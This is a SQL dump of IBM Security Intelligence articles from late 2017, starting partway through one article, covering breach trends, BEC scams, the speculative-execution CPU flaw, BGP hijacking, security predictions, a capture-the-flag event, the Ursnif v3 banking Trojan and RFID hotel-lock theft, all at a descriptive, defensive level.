can potentially be just as damaging as the breach itself. According to the “ ” sponsored by IBM Security and conducted by Ponemon Institute, “an incident response (IR) team reduced the cost by as much as $19 per compromised record.” Your incident response plan should be a dynamic document that is routinely reviewed, exercised and adjusted according to the results of a breach investigation. While stealing data and demanding ransoms is a lucrative tactic, some attackers have found that simply asking for money in a certain way can be quite effective. Business email compromise (BEC) is a threat in which an attacker sends an email asking an employee to wire money or send confidential data, such as W-2 forms. These scams are often carried out by threat actors who impersonate C-suite executives and authority figures at precisely targeted companies. Savvy attackers spoof these leaders’ email accounts and mimic their writing styles to trick victims. Fraudsters   in stolen funds between 2013 and 2016 via BEC attacks. In 2017,   tracked more than 200 companies that were tricked into sending employee W-2 forms to a malicious outsider. While phishing is often used in combination with other attacks, these BEC attacks illustrate how phishing alone can be highly lucrative for criminals. Another BEC technique observed over the past year involved attackers registering domains that closely resembled those of vendors, such as construction firms, that were engaged in multimillion-dollar projects. For example, a Canadian university was tricked into   to a cybergang posing as a trusted construction vendor. These attacks are effective because defenses are often lowered when people mistake the attacker for a person inside their circle of trust. When a user sees an email coming from an authority figure or what looks like a trusted vendor, he or she might not think to double-check the sender’s identity. This may be especially true in cases where there are fewer rungs on the corporate ladder, since it may not be unusual to receive an email from the CEO or CFO in a small or midsized company. Phishing techniques such as   continue to plague users because they are highly successful. User education programs need to continuously change to keep up with the rapidly evolving threat landscape. For example, it is no longer sufficient to simply scan an email for misspellings or grammatical errors. The phishing lures are so convincing these days that even a seasoned security professional might have difficulty spotting a fraud. Users should alert the security team of suspicious emails and only open attachments they expect to receive. Unfortunately, users tend to take a similar approach to installing software on their systems, putting their trust in vendors to deliver a secure product and legitimate updates. With the ever-rising valuation of bitcoin and other cryptocurrencies, these are quickly becoming a choice target for attackers. But stealing crypto coins is not new in 2017. In fact, some historic thefts over the years are even more significant today, given the exponential increase in price. Consider the theft in 2016 of 119,756 BTC from a  , which, at the time, equated to $77 million. Today, that haul would be valued at over $1.5 billion. Similarly, a   was robbed in 2017 of 4,700 BTC, which, within a week of the theft, fluctuated in value by almost $20 million. Initial coin offerings (ICO) are becoming popular vehicles to quickly fund an enterprising business through the sale of digital currency tokens while offering investors the potential for huge returns on their investment. ICOs have unsurprisingly become top targets for cybercriminals who, throughout 2017, devised creative ways to siphon funds and trick investors into wiring millions of dollars worth of cryptocurrency. Attackers hijacked the website of an Israeli company in the midst of its ICO and  , which is similar to a long bank account number, to receive funds. In under three minutes, more than $7 million worth of Ethereum cryptocurrency was routed to the attackers. Crafty criminals are targeting end users with some additional crypto-stealing malware techniques, such as intercepting and changing payment addresses in the clipboard to hijack payments and combing user files for crypto wallets and private keys, which could be used to steal funds. Safe computing standards should be applied to the emerging world of digital money. Crypto veterans and new users alike should employ some basic practices to help protect their digital investments. At the very least, users should employ two-factor authentication (2FA) at crypto exchanges and websites. When trading or making payments, double- and triple-check the recipient address before sending to ensure that it wasn’t changed or manipulated. For endpoint wallet attacks, consider using a hardware wallet, such as   or  , to keep private keys on external devices that are protected by PINs. While many of these data breach trends have remained the same over the years, it’s always helpful to take a step back and evaluate your own risk personally and professionally. Don’t wait to implement these simple security best practices. Failure to do so could be disastrous, while a focus on boosting enterprisewide security hygiene just might keep your organization out of the latest batch of doom-and-gloom news headlines.', '\'Bitcoin\', \'Bitcoin Mining\', \'Cloud Services Provider\', \'Cost of a Data Breach\', \'Cryptocurrency\', \'Cryptocurrency Miner\', \'Cybercrime Trends\', \'Data Breach\', \'Data Breaches\', \'Internet of Things (IoT)\', \'IoT Security\', \'Malware\', \'Patch\', \'Patch Management\', \'Phishing\', \'Phishing Attacks\', \'Ransomware\', \'Third-Party Vendors\', \'Vulnerabilities\', \'Vulnerability Management\'', 'https://securityintelligence.com/six-major-data-breach-trends-from-2017/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (50, 'CPU Vulnerability Can Allow Attackers to Read Privileged Kernel Memory and Leak Data', 'Limor Kessem', '2018-1-3', 'A hardware vulnerability, discovered independently by researchers from academia and  , underscores a microprocessor flaw that, if exploited, could allow an attacker to read data from privileged kernel memory.  is considered an important flaw for complex infrastructures and cloud deployments and must be addressed to prevent potential future impact. Since this flaw impacts all modern microprocessors, it can affect any device that uses them, including multiple operating systems running on mobile devices, laptops, workstations and servers. It is important to note that to exploit this vulnerability, a malicious actor would need to execute untrusted code on the physical system or on a virtual machine linked to that system. This may include running content from webpages loaded in web browsers or accessed through mobile apps. The flaw has three technical variations which were attributed three separate CVEs.   Each of those could result in: Performance impact will vary in each deployment and case and cannot be quantified in any absolute terms. The CPU flaw stems from the way modern processors attempt to optimize performance by speculating about correct processing paths. For example, on most modern systems, memory is stored in three general locations—the processor’s cache, main memory, and on-disk. Each type has different access speeds and storage sizes—for example, the cache is smaller and faster than main memory, which is itself smaller and faster than on-disk memory storage. This affects how quickly programs can be processed. Programs are not linear—they frequently branch between different possible processing paths. Sometimes the decision on which branch to follow requires information stored in a slow memory space, such as main memory or on-disk. Rather than idling until the information is retrieved, the processor will often speculate as to which branch will be followed. It will then continue to process this branch until the information is finally retrieved. If it chose the correct branch, it continues processing; if it chose the wrong branch, it flushes the now-incorrect processing results and then follows the correct branch. Often, speculative execution results in the processor executing instructions before it knows whether the commands violate security protections. Overall, this CPU vulnerability takes advantage of different aspects of timing in speculative processing, and more specifically, the mis-speculation window when the processor supposedly executes the wrong option but has not yet received the correct path. This variation of the CPU flaw is a new play on an older vulnerability that focuses on branch prediction. “ ” —  (Note that Intel documentation changes over time and quotes may therefore not be as accurate when Intel’s version changes.) Previously discovered vulnerabilities have proven that it is possible for code running in one security context to influence the branch prediction of code running in a completely different security context. This influence, though possible, only went   from the kernel to userspace. For example, from a hypervisor to a guest user. The novelty in CVE-2017-5715, or  , is that now, the branch prediction interference can be generated in both directions, meaning that the kernel’s predictions can be affected by an attacker who only has userspace privileges, allowing the attacker insight into data they would not otherwise have. The second variant of the flaw relies on the fact that the processor effectively does out-of-bounds code loading during the speculation phase. The purpose of the attacker here would be to trick the CPU to expose its eventual branch choice during the speculation window. Under normal circumstances, the CPU may indeed read from code it is ‘not supposed’ to execute, but once the correct branch is selected, it rolls back the execution state and discards any effects those other branches would have had. During a possible attack, the CPU may load an untrusted offset from a caller, start a load from a data-dependent offset, then load the corresponding cache line into the L1 cache. Unlike the code the CPU is expecting, the attacker’s code is longer, which would be out of bounds for that read. That will cause the execution to return to a non-speculative path, at which point the attacker could measure the time required to load data for the different paths and determine which way the CPU went and thus index of the data. The third variation of the CPU flaw at hand aims to read kernel memory from userspace   any influence/misdirection of code running in kernel space. The technical details of this variant were   by Anders Fogh, a computer engineering expert and malware analyst. In summary, during the speculation window, the CPU checks for the permissions for accessing a memory address, but that check might impose performance impact. To allow for optimal performance, the CPU could opt to check the permissions later, in an asynchronous manner, raising an exception flag only if the check fails for whatever reason. Since it is also possible to execute an instruction behind a high-latency, mis-predicted branch, to avoid taking a page fault, the speculation window can be widened by increasing the delay between the read from a kernel address and delivery of the associated exception. The result could be allowing an attacker from userspace to read from memory in kernel space without the usual checks that should be in place to limit such option. The exception is not raised until the illegal instructions retire, which under speculative execution they do not. This new triple-pronged flaw requires a risk assessment process for all organizations. Security teams will have to inventory their assets and determine which ones may be vulnerable. Then, after setting criticality and sensitivity scores, assets should be patched or applied mitigating controls. An attacker must be able to place code into an application running on the system itself or on a virtual machine attached to the system to use this exploit this vulnerability. Therefore, protections to prevent unauthorized access into systems from outside the infrastructure can serve as a first barrier, as well as existing access controls for internal users. The most immediate action security teams can take to protect assets is to prevent execution of unauthorized software, or access of untrusted websites, on any system that handles sensitive data, including adjacent virtual machines. Assume that any type of execution, including binary execution, carries the potential for attack. Also, ensure security policies are in place to prevent unauthorized access to systems and the introduction of unapproved software or software updates. If the organization is operating environments where preventing execution of unauthorized software is not possible, or is inconsistent, protection may only be possible by applying updates to system firmware, operating systems, and application code, as well as leveraging system-level protections to prevent the execution of unauthorized code. In cases of update impact issues, mitigating controls should be applied in the interim, but patching is ultimately the remediation needed to prevent potential attacks. Please note that most patches released so far require rebooting systems and must be evaluated for the potential impact of such event on a given asset. At this time, the asset types for which   should be defined are mission-critical, multi-tenant environments, such as: Remediation priority can be set to   for mission-critical single-tenant environments, as well as non-mission-critical multi-tenant environments, such as: Remediation priority can be set to  in cases of non-mission-critical, single-tenant environments, such as: In updating assets, and in some cases having to update BIOS, significant performance impact may result. The level of impact will depend on the specific processor used, the nature of the workload, and the remediation method selected by the manufacturer. Security teams should assess the exposure and potential impact to their environments before proceeding with updates that could negatively impact performance. To better understand the potential for performance impact to specific application environments, security teams are encouraged to seek information from their application vendors. In all cases, it is recommended to deploy required updates into a validation environment for testing before proceeding general deployment plans. All the relevant manufacturers are going to be issuing and releasing remediation elements and patches to address this new CPU vulnerability. Security teams should check manufacturer resources to obtain patches and updates as they become available. Security teams should look to receive and test microcode patches as well as operating system patching for underlying host and Guest. Keeping in mind common cloud security models that share security responsibilities between the vendor and their customers, organizations with cloud deployments should check into the remediation coverage offered by their cloud service provider. Defining what each side must undertake to address remediation will result in better mitigation.  can be used to discover and inventory systems within enterprise environments and, as vendors and manufacturers release remediation elements and patches, can facilitate the patching and remediation process for this flaw, as it does for any other vulnerability. BigFix administrators can create powerful custom patching tasks, procedures and policies, known as “Fixlets,” to automate the identification of vulnerable systems as well as deploy vendor-supplied patches and remediation elements, which can then be shared with the entire BigFix community. For additional information, please review the “ ” infographic. IBM customers are also invited to access the  .', '\'IBM Security\', \'Intel\', \'Vulnerabilities\', \'Vulnerability\', \'X-Force\'', 'https://securityintelligence.com/cpu-vulnerability-can-allow-attackers-to-read-privileged-kernel-memory-and-leak-data/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (51, 'BGP Internet Routing: What Are the Threats?', 'Simone Ferlin', '2017-12-21', 'Yet another incident has shone a spotlight on the insecurity of Border Gateway Protocol (BGP) internet routing. On Dec. 12, a report surfaced regarding a   that was misrouting sites. Analysts reviewing the data noted that it appeared targeted and may have been more than just a BGP leak. BGP leaks and hijacks have been occurring since long before this year. In fact, data from   revealed that BGP incidents have remained steady over the last two years. However, with a string of incidents in 2017 making headlines, it’s worth discussing how this communication protocol works, outlining possible attack scenarios and reviewing its potential security shortcomings and improvements. BGP, as defined in   and  , is the internet protocol that allows independently operated networks, also called autonomous systems (AS), to inform each other about their reachability. Each time a BGP router advertises its reachability, also called IP prefix, to its neighbor, the newly received information is compared against the router’s stored knowledge. If this new advertisement provides a better path to reach a certain network, the information is updated locally and all immediate neighbors are informed. This way, in simple terms, networks worldwide can reach each other, forming the complex topology of the global internet. \n \n New autonomous systems can emerge or disappear every day. Because its design is based on  , the BGP advertisement messages are generally accepted by any other router with means to verify neither its origin nor its integrity — and the announcements are often unencrypted. Below are three ways in which attackers can potentially abuse BGP. While some BGP incidents are intentional, others, such as BGP route leaks, may be caused by   within the operations of these large networks. Regardless of intent, they can render the internet vulnerable and unstable. \n \n By looking at isolated events and data from institutions that analyze BGP data, IBM Security can make broad assessments about the BGP threat landscape. Are these attacks changing in terms of frequency, length or impact to the stability of the internet? BGP hijacking and leak incidents have been a recurring threat for over a decade now. One high-profile incident dates back to 2008, when a BGP hijack caused a global  . However, in 2017 alone, several notable events cast a spotlight on BGP vulnerabilities: According to data derived from BGPStream, there has been no notable fluctuation in either possible BGP hijacks (“possible” because  ) or leaks in the past five and a half months. The exception is the notable increase in BGP leaks in August, largely a result of the massive BGP route leak by Google noted above (see Figure 3). \n How does this compare to the longer term? A   used BGPStream data to highlight the frequency of BGP leaks and possible BGP hijacks between November 2015 and May 2017. By comparing this data with data from the past six months, we can identify the following trends. For the first half of 2016, possible BGP hijacks fluctuated between approximately 150 and 200 incidents per month. During the second half of 2016, however, the frequency increased slightly to around 230 incidents per month. For 2017, approximately 200 incidents occurred between January and November. This data, therefore, does not reflect an increase in BGP hijacks over the last two years. In 2016, the monthly average of BGP leaks was around 184. Aside from the stark increase of leaks in August 2017 (as shown in Figure 3), the volume has remained relatively static throughout 2017. Removing the August anomaly, the monthly average is 226 leaks. While this denotes an increase year over year, it is not a significant boost. BGP incidents put the internet’s stability at risk. For many internet providers, routing security only becomes a priority in the aftermath of an incident. However, long-term protection against BGP abuse requires organizations to implement security measures. Fortunately, there is a silver lining. Given the dimension of the problem to be tackled, standardization bodies such as the Internet Engineering Task Force (IETF) and agencies such as the National Institute of Standards and Technology (NIST) and the Department of Homeland Security (DHS) are   to provide a better set of security standards for BGP. Through this effort, the agencies have made available the   framework with a focus on the following three components: Resource Public Key Infrastructure (RPKI), BGP Origin Validation and BGP Path Validation (BGPSec). This initiative is supplemented by enormous efforts to make BGP data available. Entities such as router equipment vendors, internet content and access providers, and transit networks are encouraged to share data to help solve this problem. Organizations seeking to protect their networks from BGP internet routing attacks can leverage  , an extension of BGP that provides additional security. When used in conjunction with origin validation, it may prevent a variety of route hijacking attacks. The downside is that BGPSec can potentially result in more complexity in routing updates and may require more hardware to compute signatures — possibly a large infrastructural change with many unknowns for some operators. Security firm Team Cymru also developed a list of   to help organizations secure BGP on their routers.', '\'IBM X-Force Research\', \'Internet\', \'Internet Service Provider (ISP)\', \'Router\', \'Security Framework\'', 'https://securityintelligence.com/bgp-internet-routing-what-are-the-threats/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (52, 'New Year, New Threats: Five Security Predictions That Will Take Hold in 2018', 'Caleb Barlow', '2017-12-14', 'On Dec. 31, we’ll close the books on a year that will go down in history — not due to world events, scientific discoveries or pop culture happenings, but because of the record numbers of personally identifiable information (PII) exposed through major data breaches and cybersecurity events that happened throughout the year. At the same time, rapid technology innovation caused companies across industries to rethink how they leverage digital tools such as artificial intelligence (AI), machine learning, augmented and virtual reality, and more into their operations. But with these changes — according to Gartner’s “ ,” 40 percent of companies have already made progress in piloting or adopting AI solutions — there will also be new possibilities for cybercriminals to capitalize on vulnerabilities. The confluence of these events is forcing industries of all types and organizations of all sizes to rethink how they secure information within their enterprises and learn from mistakes of the past. As we look forward to a new year with new resolutions, we also look at how the developments in both cybersecurity and technology, as well as new and emerging threats, will impact 2018. We’re fortunate to have some of the best researchers in the security world on our   team. We polled them for ideas about major trends in 2018, and some unique perspectives emerged. Let’s take a look at the top five IBM Security predictions for 2018. 2018 will see a rise in AI-based attacks as cybercriminals begin using machine learning to spoof human behaviors. The cybersecurity industry will need to tune its own AI tools to better combat the new threats. As AI software becomes more mainstream and/or open source, cybercriminals will adopt AI tools to not only automate and accelerate their current activities, but also to more closely mimic natural behavior for social engineering and phishing purposes. The cat-and-mouse game of cybercrime and security innovation will rapidly escalate to include   on both sides. Our   team thinks that Africa, with its growth in technology adoption and operations, rising economy and increasing number of local resident threat actors, has the largest potential for net new, impactful cyber events. In 2018, Africa will emerge as a new focus area for cyberthreats: Attacks targeting organizations based there and events originating from the continent are both expected to rise. Data from the more than   stolen in 2017 will be used at a scale never seen before. Legislation to curb the use of stolen data will move closer to reality and companies will move further away from using identifiers such as Social Security numbers (SSNs). Alternatives to SSNs could include blockchain identity solutions, smart ID cards or e-cards, biometrics or a combination of these methods. Companies will shift to more secure methods involving   and behavioral analytics. We’ll see a pivot from using ransomware to lock up desktop computers toward attacking Internet of Things (IoT) devices. Expect the ransom to be lower as fraudsters move to a volume play and find a price point that is less than the cost of just buying a new one for users. Large organizations with deployments of IoT security cameras, DVRs and sensors will be especially impacted by the coming wave of IoT ransomware. Like the recent rise of ransomware attacks in the  , cybercriminals will target infrastructure that could adversely impact operations. 2018 will be the year in which we see a major company demonstrate a fast and appropriate response to a large-scale data breach or cyberattack, including effective communications to inform stakeholders within and outside the business of the impact. With the implementation of GDPR in May 2018, organizations doing business in the European Union (EU) will face   around the protection of data and must report data breaches to regulators within 72 hours (or face steep fines of up to 4 percent annual turnover) and potentially notify the customer as well. With these penalties in mind, organizations are placing greater emphasis on preparing their incident response plans, which, we hope, will lead to an overall improvement in the aftermath of a breach. The cybersecurity landscape changes so quickly that I wouldn’t be surprised if something bigger emerges and knocks one of these security predictions off the list early in the year. We’ll have to wait and see what 2018 brings, but if 2017 is an indication of the trajectory cybercriminals are on, the security community had better rest up over the holidays. \n Never miss a new episode of the Security Intelligence podcast! Subscribe now on  ,   or your favorite podcast platform.', '\'Artificial Intelligence (AI)\', \'General Data Protection Regulation (GDPR)\', \'Incident Response (IR)\', \'Internet of Things (IoT)\', \'IoT Security\', \'Ransomware\', \'Risk Management\'', 'https://securityintelligence.com/new-year-new-threats-five-security-predictions-that-will-take-hold-in-2018/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (53, 'Inside the IBM X-Force Command Advanced Persistent Threat CTF Competition', 'Richard Moore', '2017-12-7', 'On Thursday, Nov. 23, 2017, the IBM X-Force Command Advanced Persistent Threat (APT) capture the flag (CTF) competition kicked off at the   conference in Dublin. Forty-eight contestants across 12 teams battled it out in a free-for-all competition that required hacking, defending and forensics skills. A cybersecurity   is designed to highlight the strengths and weaknesses in a security team’s technical aptitude, response strategies and time management. Teams must amass as many points as possible, which can be achieved through multiple routes. Having multiple ways to score points encourages teams to organize and think carefully about where the focus of each team member should be. The IBM X-Force CTF contest is broken down into four sections: The   is designed around the idea of an APT. An APT is a network attack where the attacker’s main objective is to gain unauthorized access to a system and remain there undetected for an extended period of time. Once in the system, the threat actor can start siphoning out data or just lay in wait preparing for the next stage. To simulate an APT in our CTF, participants must run the CTF’s custom-made malware to claim control of a server and begin scoring points. Once a team has control of a server, it must do everything it can to hold onto it and protect it from other competing teams. \nPoints are awarded for every minute a team can hold onto a server. As each team expands its botnet of vulnerable servers, it will harvest more points, pushing the team up the leaderboard. Each server is mapped to a country, which lights up on the scoreboard when captured by a team. This allows everyone to follow the malware epidemic spread around the game globe. Teams can also score points by completing offline security puzzles around the areas of packet capture analysis, forensics, reverse engineering and steganography. While teams work on those elements, they also need to keep an eye out for one-off security questions throughout the game, where only the first correct answer is accepted. \n Participants arrive with their laptops, attack tools and any automation that they have developed to help them complete the challenges. Once everyone has connected to the CTF’s sandboxed network and the rules have been explained, a six-hour timer is started and the players are let loose. Each vulnerable server is configured to report back to  , an event management and log aggregation tool. As players start to attack the vulnerable servers, QRadar’s dashboard begins lighting up. Brute-force attacks, privilege escalation attempts and a range of other messages highlight the player actions for anyone passing by to review. The IBM X-Force Command team also leverages QRadar to monitor the competition for prohibited malicious activity. This is a hacking competition, after all.\n Bringing attention to cyberattacks can be a tricky affair, especially when your audience is nontechnical. Most cyberattacks lack impact and meaning to some organizations, and more so to the public. This is a substantial hurdle to overcome when trying to draw attention to the growing volume of cyberthreats. How do you demonstrate the potential damage of a cyberattack in a visual, tangible and memorable way? An interesting solution is to use hackable   and pair them with models created using 3-D printing technology. Hadley’s Hope is a science fiction-themed model city with physical, hackable services that are controlled by IoT devices. When a hacker gains access to one of these services, his or her actions are made visually apparent to anyone observing the model city. When the city’s train starts moving too fast, for example, or when its perimeter fence lights are flashing seemingly at random, it is very apparent that the system has been compromised. With these visual cues, it is much easier to demonstrate the potential dangers of a cyberattack to both technical and nontechnical audiences. On the day of the competition, many teams attempted the Hadley’s Hope challenge, with one team managing to hack in and take control of the perimeter fence and train. The successful team revealed that this was one of the most enjoyable challenges — so enjoyable, in fact, that the team wanted to continue triggering events in the city even after the game had ended. A CTF competition challenges participants to find and exploit security vulnerabilities, solve problems and fend off network attacks while keeping an eye on the game clock. Many contestants create automation scripts on the day of the competition to help them slow opposition teams taking control of their servers or to help them capture another server. Team building is a big part of a CTF competition since individuals must work together as a team to succeed. Teams must communicate, divide work and assist one another to score high on the leaderboard. The way we train the current and next generation of cybersecurity specialists will have a defining impact on the level of security we all feel when using technology. Fostering creativity and motivating your workforce can be challenging, but when we gamify these efforts, it takes advantage of our competitive side, improving our learning, innovation and preparation. A CTF is one approach to tackling the security skills gap. Another is   incident response training. During the CTF, we managed to preregister 15 groups from organizations in the industry and colleges for our new red on blue experience, which is starting in January 2018. Groups of eight to 10 people will join us out at our Dublin campus, where they will be divided into two teams. The red team will be handed attack tools and small snippets of information about the targets that it must attack to disrupt normal service and exfiltrate mock customer data. The blue team will be given a sandboxed network with servers and web applications that it must defend from the red team. These scenarios offer participants a chance to hone their technical skills, gain a hacker’s perspective and test team dynamics. They also give IBM an opportunity to showcase the IBM Security stack in live, configurable scenarios and generate new connections with businesses and academia. Throughout the year, we will grow and evolve the experience to incorporate more scenarios around malware,   and social engineering.', '\'Academia\', \'Cybersecurity Training\', \'Education\', \'IBM X-Force Command Center\', \'Incident Response (IR)\', \'Security Awareness\', \'Security Professionals\', \'Security Training\', \'Skills Gap\'', 'https://securityintelligence.com/inside-the-ibm-x-force-command-advanced-persistent-threat-ctf-competition/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (54, 'Ursnif v3 Emerges, Targets Australian Bank Customers With Redirection Attacks', 'Limor Kessem', '2017-11-28', 'Starting in the summer of 2017, IBM X-Force research detected a new variation of the   being tested in the wild. The malware is based on the same malcode of the original Ursnif Trojan (aka Gozi ISFB), but features some modifications on the code injection level and to attack tactics. Beyond these changes, the internal build number has also changed to indicate v3 increments versus the existing v2 builds, making this iteration an upgrade of sorts that was most likely undertaken by a different malware developer. X-Force noted that while changes were most significant in the code injection mechanism, the malware’s operators also opted to develop redirection attacks to target business and corporate banking customers in Australia. The redirection scheme is implemented through the configuration file and not embedded into the code itself. This finding is significant because it suggests that a new group has joined the cybercrime arena and is specifically operating in Australia, where malware gangs such as TrickBot and Dridex already have a firm foothold. Another notable issue is that Gozi v3 targets business and corporate banking users with redirection attacks, a sophisticated tactic currently used by cybergangs such as Dridex, GootKit and  . Ursnif v2 variants are active in the wild alongside this recent version. X-Force initially identified Ursnif v3 around August 2017. During what appeared to be a testing phase, the malware’s operators seemed very careful to keep the malware silent, promptly taking resources offline soon after each minor test. X-Force has been following this development and now sees an increase in activity and more elaborate malware configurations. Generally speaking, the lion’s share of the malware’s DNA was adopted from the leaked Gozi ISFB code, and the developer kept most parts of the original code injection method. At some point in the code injection flow, the v3 developer added some original ideas as well. X-Force noted that the changes apparently aim to shuffle things up, move away from hooking the same APIs and improve the code over time. This recent iteration of Ursnif, although using an existing code base, should be considered a separate development, since it is likely to be further modified over time. The differentiating points also include an activity turf for v3, focused exclusively in Australia at this time, versus v2 variants, which are active all over the world and have been especially prevalent in Japan as of the third quarter of 2017. Ursnif v3 is the first iteration of this malware that uses redirection attacks, which is another way in which it differs from active v2 variants. Target lists fetched in November 2017 showed that the malware’s operators dedicated a general configuration to small banks and credit unions in Australia and added a few other, bank-specific configurations dedicated to launching redirection attacks against business and corporate banking customers. In a redirection attack, the victim is diverted to a fake website hosted on an attacker-controlled server. The malware maintains a live connection with the bank’s legitimate webpage to ensure that its genuine URL and digital certificate appear in the victim’s address bar. At that point, the malicious actors can use webinjections to steal login credentials, authentication codes and other personally identifiable information (PII) without tripping the bank’s fraud detection mechanisms. In terms of campaign size, Gozi v3 is flying under the radar, keeping distribution limited and targeted. This is likely because, like other gang-owned Trojans nowadays, its operators are more interested in focused infections to target businesses rather than spreading far and wide and attracting unwanted attention. In terms of the attack method, X-Force researchers noted that the attackers are likely relying on account and device takeover schemes using Ursnif v2’s custom   module. The Ursnif Trojan has been active in the wild for at least a decade. The code base is one of the longest-standing banking Trojans in the wild today. It was first discovered in 2007 when it was operated by a closed group of developers and cybercriminals, but has since evolved in various directions. Ursnif’s code was leaked in 2010, giving rise to its reuse in subsequent  . It was then used as the core code for the   and   Trojans, to name a few. Although Ursnif varieties have come and gone since 2007, over the past few years, X-Force has been tracking an ongoing project that is believed to operate in a crime-as-a-service model. The central part of that operation is an Ursnif variation that X-Force research dubbed Ursnif v2/Gozi v2 after the last major upgrade of that code base. That specific malware has been extremely active, especially in the past two years, regularly attacking banking customers in different parts of the world, including North America, Europe and Japan. X-Force noted that for the entire year of 2016 through 2017, Ursnif v2 has been one of the top players in the financial cybercrime arena, both in terms of its code evolution and attack volumes. \n \n In the past give years, the banking malware arena has increasingly become a playing field on which organized crime thrives. As  , new ones enter the cybercrime arena, but code sophistication and operational savvy continue to paint the picture of nefarious groups that drive an ever-evolving threat landscape. In early November 2017, X-Force released information about a new banking Trojan dubbed  , yet another group looking to target banks and, more specifically, business accounts. Gozi v3 joins an existing group of actors whose target lists reveal similar intentions. To help mitigate the risk posed by banking Trojans, please refer to our  . Banks should also consider implementing   to protect their customers against evolving financial threats such as Ursnif.', '\'Australia\', \'Bank Fraud\', \'Bank Security\', \'Banking\', \'Banking Malware\', \'Banking Trojan\', \'IBM X-Force Research\', \'Malware\', \'Threat Intelligence\', \'Trojan\', \'X-Force\'', 'https://securityintelligence.com/ursnif-v3-emerges-targets-australian-bank-customers-with-redirection-attacks/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (55, 'Traveling This Holiday Season? Beware of RFID Attacks', 'Dave McMillen', '2017-11-28', 'Everywhere around us, it seems like the traditional lock and key have been traded in for a plastic card or key fob device. These alternative devices use radio frequency identification (RFID), which gives us access to our cars, places of work and hotel rooms. Nowadays, RFID is a very popular part of our payment cards, allowing us to merely touch a point-of-sale (POS) panel to pay for purchases. This technology has created a convenience that many of us may take for granted, especially when it comes to security. Many consumers, and even vendors at times, have a false sense of security because they believe this technology is so complex that it is infallible. Unfortunately, RFID technology is rather simple, has   and is   by malicious criminals. Enterprises that implement RFID technology, especially where it is used to provide access-level controls, must understand the potential security risks involved. Consumers should also be cognizant of the risks and take precautions when paying at contactless payment or touch-to-pay terminals and when staying in hotels that use chip cards for room access. RFID technology has been around since World War II. In many applications where it is used today, such as tracking production, asset identification and billing, improvements to the technology have helped lower security risks. However, the use of RFID in daily business and consumer operations is still considered new technology when used for access control. It can be more vulnerable to compromise. Malicious actors know that the quickest and most profitable way to exploit this technology is to gain access to areas that contain physical property they can acquire. A simple search on the Dark Web or public internet can yield instructions and places to acquire hardware to perpetrate access control theft. Making matters worse, it is extremely easy to buy card stock and hardware that can enable virtually anyone to clone an access ID card. With that said, we’re not painting all RFID locks with the same generic brush. RFID lock vendors offer varying levels of security, and enterprises are encouraged to thoroughly assess the technologies available to them and implement higher levels of encryption where possible. Earlier this year, a close friend of mine — and a very popular session musician and performance artist — stayed at a world-renowned four-star hotel. She was traveling with her highly prized instruments and some audio equipment — approximately $20,000 in assets. After she checked in at the hotel’s reception, she rode the elevator to the 15th floor, entered her room, placed all of her baggage on the bed and went back downstairs to a café. After about an hour of enjoying a cup of tea, she returned to her room and found that all of her belongings were gone! Not only were her instruments missing, but so was her luggage, which contained cash, credit cards and her passport. How could this happen? More concerning is the speed at which this perpetration took place. The hotel staff informed her that about 15 minutes after she initially left the room to go to the café, an entry was logged in the access key system. They even tried to convince my friend that the second entry was hers! There wasn’t any security footage at that hotel, so she couldn’t prove that it wasn’t her and the hotel couldn’t prove that it was. Let’s try recreating the scenario: My friend enters the hotel lobby with all her baggage. Some of her bags take the shape of their contents, such as the saxophone and the trumpet. Lurking in the hotel lobby is the perpetrator. With all the activity happening in a large hotel lobby, he or she blends in with the crowd. More than likely, the criminal is watching for someone who looks like he or she may possess something of value. Either that, or the perpetrator is specifically targeting my friend. Once the fraudster identifies the target, he or she has a couple of options for carrying out the evil deed: Fortunately, this particular incident has a relatively happy ending. Local law enforcement officials gained a lead on the stolen saxophone from a pawn broker and my friend was able to recover some of her other stolen belongings. Victims of theft are typically not so lucky. This example illustrates how RFID can be vulnerable to relatively simple attacks that require neither technical savvy nor costly equipment. RFID hacks are becoming   in the consumer realms, but news of enterprise-level incidents sometimes hits mainstream media as well. Earlier this year, for instance, a cybercriminal group took control of a hotel’s key card system, locking guests out of their rooms and preventing the hotel from issuing new cards. The malicious actors then held the key card system for ransom and   of two bitcoin before they would give control back to the hotel. It is unfortunate that the subject of RFID vulnerabilities receives little to no attention at the consumer level, although personal RFID key card-related security incidents are numerous and can happen to anyone staying in hotels around the world. This silence may be due to laws that   in the case of room theft as long as they provide room safes or allow guests to store valuables in the hotel’s main safe. If a guest doesn’t use these options and is a victim of theft, the hotel may be covered against paying for those valuables. Ironically, some hotels use RFID tags to prevent theft of their towels and bathrobes! A person carting off with such items would be scanned at the door just like in a major retail store, which would sound an alarm. Another recent trend in the   is the switch to contactless access via mobile app-based keys. This system uses near-field communication (NFC), which is a subset of RFID technology. An NFC-enabled device can function as both an NFC reader and an NFC tag, which allows these devices to operate using peer-to-peer communication. Guests download an app to their phones and then download their virtual keys from the cloud. Once downloaded, all they have to do is approach their hotel door and the Bluetooth-enabled RFID door reader intercepts a signal containing the key ID, which automatically opens the door. Like RFID, virtual keys can be compromised. There are many how-to videos, articles and apps that demonstrate how to subvert the built-in security of these systems. These security weaknesses are not always present in the RFID device itself. For example, a smartphone might contain a vulnerability that could allow a lobby creeper to remotely access a victim’s phone and grab the key file. Once the key ID is downloaded from the cloud, it maintains residency on the smartphone, allowing an attacker to exploit this weakness. There are numerous RFID lock manufacturers out there, each of which introduces its own security vulnerabilities, making it difficult to provide a comprehensive, bulleted list of countermeasures to fix all RFID-related issues. However, the best practices described below can help reduce exposure to RFID attacks and mitigate the risk of unauthorized access.  technology, which is an enclosure used to block electromagnetic fields, can help block malicious actors as well. This type of shield has already been incorporated into some bags and wallets to prevent attackers from intercepting the RFID tag of a victim’s key card, for example. Unfortunately, this type of shield does not mitigate other attacks that target the RFID card reader or the victim’s mobile device. The use of RFID technology as an application for   is still in an early stage of development from a security standpoint. Hotels and other enterprises that use this technology for access controls should take the following steps: Individuals are unable to alter their access cards or the card reader to add additional 